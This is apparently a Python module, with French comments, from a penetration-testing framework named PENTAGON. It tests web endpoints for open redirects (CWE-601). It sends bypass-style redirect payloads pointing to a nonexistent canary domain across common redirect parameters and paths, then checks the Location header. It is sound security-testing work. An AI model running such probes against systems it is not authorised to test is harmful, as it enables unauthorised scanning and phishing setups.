"""
Outil de test de redirection ouverte (Open Redirect) pour PENTAGON.

Prouve, PAR ATTAQUE RÉELLE mais NON DESTRUCTIVE, qu'un endpoint redirige vers
une URL EXTERNE arbitraire fournie par l'utilisateur, sans valider le domaine.
Un attaquant peut alors forger un lien vers la cible légitime qui renvoie vers
un site malveillant (phishing très crédible).

Méthode (boîte noire, offensive, bornée à la preuve) :
  1. On cible des endpoints candidats (découverts + chemins de redirection
     courants) et des noms de paramètre de redirection usuels.
  2. On injecte une URL EXTERNE NEUTRE de test (un domaine canari inexistant).
  3. Si la réponse est une redirection (3xx) dont l'en-tête `Location` pointe
     vers ce domaine externe, la redirection ouverte est PROUVÉE.

GARDE-FOU « prouver, jamais ravager » : on NE SUIT PAS la redirection
(allow_redirects=False) ; on se contente d'inspecter l'en-tête Location, et la
cible de test est un domaine neutre et inexistant.

Catégorie d'action RoE : exploitation.
Standards :
- OWASP A01:2021 (Broken Access Control) — Unvalidated Redirects and Forwards
- OWASP WSTG-CLNT-04 (Testing for Client-side URL Redirect)
- CWE-601 (URL Redirection to Untrusted Site)
"""

from datetime import datetime, timezone
from typing import Any
from urllib.parse import urlparse


DEFAULT_TIMEOUT = 15

# Domaine canari externe, neutre et inexistant (preuve sans nuisance).
CANARY_HOST = "pentagon-redirect-test.example"

# Charges de redirection (variantes de contournement usuelles).
PAYLOADS = [
    f"https://{CANARY_HOST}/",
    f"//{CANARY_HOST}/",
    f"https:/{CANARY_HOST}/",
]

# Noms de paramètres de redirection usuels.
REDIRECT_PARAMS = ["url", "next", "redirect", "redirect_uri", "return",
                   "returnUrl", "return_to", "dest", "destination",
                   "continue", "go", "target", "r", "u", "to"]

# Endpoints de redirection courants (sondés même sans découverte).
COMMON_REDIRECT_PATHS = ["/api/go", "/go", "/redirect", "/api/redirect",
                         "/out", "/link", "/api/link"]

# Indices qu'un endpoint découvert fait probablement de la redirection.
REDIRECT_HINTS = ("go", "redirect", "out", "link", "return", "continue",
                  "logout", "login", "sso", "oauth", "auth", "next")


def _base_origin(url: str) -> str:
    """Origine (scheme://host[:port]) d'une URL ou d'un domaine."""
    p = urlparse(url if url.startswith("http") else f"https://{url}")
    return f"{p.scheme}://{p.netloc}"


def _redirect_is_external(location: str, canary_host: str) -> bool:
    """Vrai si l'en-tête Location pointe vers le domaine canari externe."""
    if not location:
        return False
    loc = location.strip()
    # Protocole-relatif (//host/...) ou absolu (scheme://host/...)
    parsed = urlparse(loc if "//" in loc else "//" + loc, scheme="https")
    return parsed.netloc.lower() == canary_host.lower()


def _candidate_endpoints(target_base: str,
                         candidate_urls: list[str] | None) -> list[str]:
    """Chemins de redirection courants + endpoints découverts pertinents."""
    origin = _base_origin(target_base)
    endpoints: list[str] = [origin + p for p in COMMON_REDIRECT_PATHS]
    seen = set(endpoints)
    for url in candidate_urls or []:
        u = url if url.startswith("http") else origin + (url if url.startswith("/") else "/" + url)
        u = u.split("?", 1)[0]
        if any(h in u.lower() for h in REDIRECT_HINTS) and u not in seen:
            endpoints.append(u)
            seen.add(u)
    return endpoints


def run_open_redirect_test(target_base: str,
                           candidate_urls: list[str] | None = None,
                           token: str | None = None,
                           timeout: int = DEFAULT_TIMEOUT,
                           delay_between_requests: float = 0.5) -> dict[str, Any]:
    """
    Teste la redirection ouverte sur des endpoints candidats.

    Returns:
        {
          "status": "success" | "error",
          "tested_endpoints": [...],
          "findings": [{title, severity, affected_endpoint, param, payload,
                        evidence, owasp, cwe, confidence}],
          "vulnerable": bool,
          "error": "..."
        }
    """
    import time
    import requests  # import différé

    result: dict[str, Any] = {
        "status": "success",
        "tested_endpoints": [],
        "findings": [],
        "vulnerable": False,
        "error": None,
    }

    endpoints = _candidate_endpoints(target_base, candidate_urls)
    result["tested_endpoints"] = endpoints
    headers = {"User-Agent": "PENTAGON-Exploitation-Agent/1.0"}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    findings: list[dict[str, Any]] = []
    started = datetime.now(timezone.utc)

    for endpoint in endpoints:
        proven = False
        for param in REDIRECT_PARAMS:
            if proven:
                break
            for payload in PAYLOADS:
                try:
                    resp = requests.get(endpoint, params={param: payload},
                                        headers=headers, timeout=timeout,
                                        allow_redirects=False)
                except requests.exceptions.RequestException:
                    continue
                finally:
                    time.sleep(delay_between_requests)

                location = resp.headers.get("Location", "")
                if 300 <= resp.status_code < 400 and _redirect_is_external(location, CANARY_HOST):
                    findings.append({
                        "title": "Redirection ouverte (open redirect) vers un domaine externe",
                        "severity": "medium",
                        "affected_endpoint": f"{endpoint}?{param}=",
                        "param": param,
                        "payload": payload,
                        "evidence": f"HTTP {resp.status_code} Location: {location[:120]}",
                        "owasp": "A01:2021",
                        "cwe": "CWE-601",
                        "confidence": 0.95,
                    })
                    proven = True
                    result["vulnerable"] = True
                    break

    result["findings"] = findings
    result["duration_seconds"] = (datetime.now(timezone.utc) - started).total_seconds()
    return result


if __name__ == "__main__":
    import json
    import sys
    base = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    print(json.dumps(run_open_redirect_test(base), indent=2, ensure_ascii=False, default=str))
